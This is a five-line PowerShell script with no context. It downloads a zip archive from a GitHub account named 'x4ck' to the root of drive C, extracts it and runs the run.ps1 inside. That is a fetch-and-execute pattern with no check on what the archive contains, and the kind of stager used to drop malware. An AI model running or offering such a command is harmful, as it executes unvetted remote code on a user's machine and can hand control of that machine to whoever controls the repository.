Import-Module BitsTransfer
Start-BitsTransfer -Source "https://github.com/x4ck/me/raw/master/ps.zip" -Destination "c:\ps.zip"
Expand-Archive c:\ps.zip -DestinationPath c:\powershell
cd c:\powershell\
.\run.ps1
